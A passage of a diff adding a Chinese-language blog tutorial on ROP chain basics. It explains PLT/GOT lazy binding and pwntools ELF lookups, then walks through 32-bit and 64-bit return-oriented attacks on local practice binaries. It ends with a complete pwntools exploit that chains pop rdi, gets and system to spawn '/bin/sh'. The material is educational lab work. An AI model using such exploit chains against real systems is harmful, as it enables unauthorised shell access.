+<p>3️⃣ 在 libc 中找到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts 地址</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc puts = 0x7ffff7a5f690</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="写入-GOT"><a href="#写入-GOT" class="headerlink" title="写入 GOT"></a>写入 GOT</h4><!--more-->
+<p>动态链接器会做一件关键事情：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@got = 0x7ffff7a5f690</span><br></pre></td></tr></table></figure>
+<p>也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把真实地址写入 GOT</span><br></pre></td></tr></table></figure>
+<p>动态链接器最后会：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp libc_puts</span><br></pre></td></tr></table></figure>
+<p>于是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;hello&quot;)</span><br></pre></td></tr></table></figure>
+<p>真正执行。</p>
+<hr>
+<h4 id="第二次调用-puts"><a href="#第二次调用-puts" class="headerlink" title="第二次调用 puts"></a>第二次调用 puts</h4><!--more-->
+<p>再次执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call puts@plt</span><br></pre></td></tr></table></figure>
+<p>流程变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp [puts@got]</span><br></pre></td></tr></table></figure>
+<p>此时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@got = libc_puts</span><br></pre></td></tr></table></figure>
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp libc_puts</span><br></pre></td></tr></table></figure>
+<p>直接执行。</p>
+<p>不会再走动态链接器。</p>
+<hr>
+<h4 id="完整流程图"><a href="#完整流程图" class="headerlink" title="完整流程图"></a>完整流程图</h4><!--more-->
+<p>第一次调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">call puts@plt</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">puts@plt</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">jmp [puts@got]</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">puts@plt+6</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">push relocation_id</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">plt0</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">ld.so 动态链接器</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">查 libc puts</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">写入 GOT</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">jmp libc_puts</span><br></pre></td></tr></table></figure>
+<p>第二次调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call puts@plt</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">jmp [puts@got]</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">libc_puts</span><br></pre></td></tr></table></figure>
+<h2 id="ELF文件处理"><a href="#ELF文件处理" class="headerlink" title="ELF文件处理"></a>ELF文件处理</h2><!--more-->
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(&quot;./stack_overflow_32_rop.elf&quot;)</span><br><span class="line">system_plt = elf.symbols[&#x27;system&#x27;]</span><br></pre></td></tr></table></figure>
+<p>意思是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从 ELF 的符号表里找到 system 的地址</span><br></pre></td></tr></table></figure>
+<p>最终得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system@plt 的地址</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system@plt = 0x08048460</span><br></pre></td></tr></table></figure>
+<p><code>elf = ELF()</code> 之后可以得到很多信息。</p>
+<p>例如：</p>
+<h3 id="1-找-PLT"><a href="#1-找-PLT" class="headerlink" title="1 找 PLT"></a>1 找 PLT</h3><!--more-->
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elf.plt[&#x27;puts&#x27;]</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@plt</span><br></pre></td></tr></table></figure>
+<p>地址。</p>
+<hr>
+<h3 id="2-找-GOT"><a href="#2-找-GOT" class="headerlink" title="2 找 GOT"></a>2 找 GOT</h3><!--more-->
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elf.got[&#x27;puts&#x27;]</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@got</span><br></pre></td></tr></table></figure>
+<p>地址。</p>
+<hr>
+<h3 id="3-找函数"><a href="#3-找函数" class="headerlink" title="3 找函数"></a>3 找函数</h3><!--more-->
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elf.symbols[&#x27;main&#x27;]</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main 地址</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="4-找字符串"><a href="#4-找字符串" class="headerlink" title="4 找字符串"></a>4 找字符串</h3><!--more-->
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next(elf.search(b&quot;/bin/sh&quot;))</span><br></pre></td></tr></table></figure>
+<p>查找：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
+<p>地址。</p>
+<h2 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h2><!--more-->
+<img src="/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/image-20260310134715459.png" class="" title="image-20260310134715459">
+<p>这是一个32位程序，我们可以看到有一个sh_addr这是因为在rodata段中有字符串其中包含sh这个内容，因此我们在rodata中读取这个字符串作为system的输入参数</p>
+<p>至于payload，我们将eip覆盖成system的入口地址之后，需要模拟正常执行system函数的栈环境，对于32位来说，函数传参使用栈传参，所以现在高位写入参数地址，再在低位写入返回地址（复合函数调用的过程：先Push 参数，再push returnaddress）</p>
+<p>那么如果没有这种特殊字符串呢？我们可以向bss段（未初始化的全局变量）写入数据，然后再让system函数读取我们写入的/bin/sh就能执行了：</p>
+<img src="/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/image-20260310135448570.png" class="" title="image-20260310135448570">
+<p>这边对payload进行解释：首先跳转到gets函数，他的参数只有一个，就是需要读入数据的地址，然后返回到system，system的参数是第二个bss_addr 进而就能执行了</p>
+<p>由于gets需要我们读入，因此还需要在发送payload后发送一个需要的字符串</p>
+<p>那么针对64位程序，由于64位下的函数传参是使用寄存器传参，因此和32位的攻击方式不同：</p>
+<p>需要使用gadget：即汇编代码片段</p>
+<p>我们可以采用下面的指令进行查找：ROPgadget —binary=./<em>*</em>    —only=”pop|ret”进而能够看到类似pop rdi ret这样汇编代码的地址，然后就能利用了：</p>
+<img src="/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/image-20260310142043170.png" class="" title="image-20260310142043170">
+<p>这个流程就是先返回到pop rdi ret这个代码段的地址</p>
+<p>然后将bss的地址放到rdi中，然后ret，ret实际上就是将栈顶的数据放在rip寄存器中，然后栈帧指针向高位移动，也就是说会跳转到gets函数，那么由于rdi中已经放了bss地址，所以就相当于执行gets(bss_addr),执行完毕后继续return到pop_rdi的地址，最后再system</p>
+<blockquote>
+<p><strong>函数调用之后，参数寄存器（如 rdi）通常不会保持原值，因此不能假设 <code>gets</code> 返回后 <code>rdi</code> 仍然是 <code>bss_addr</code>。</strong></p>
+</blockquote>
+<p>所以 ROP 链需要 <strong>再次设置一次 <code>rdi</code></strong>。</p>
+<p>ret<br>↓<br>pop rdi<br>↓<br>rdi = bss_addr<br>↓<br>ret<br>↓<br>gets(bss_addr)<br>↓<br>输入 “/bin/sh”<br>↓<br>gets ret<br>↓<br>pop rdi<br>↓<br>rdi = bss_addr<br>↓<br>ret<br>↓<br>system(“/bin/sh”)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./stack_overflow_64_rop.elf&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./stack_overflow_64_rop.elf&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x401173</span></span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40116a</span></span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span>*offset</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(gets)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(system_plt)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里才是真正写入 .bss</span></span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/03/11/%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" rel="prev" title="栈漏洞基础">
+                  <i class="fa fa-angle-left"></i> 栈漏洞基础
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/03/13/ret2libc/" rel="next" title="ret2libc">
+                  ret2libc <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Hanson</span>
+  </div>
+<div class="busuanzi-count">
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
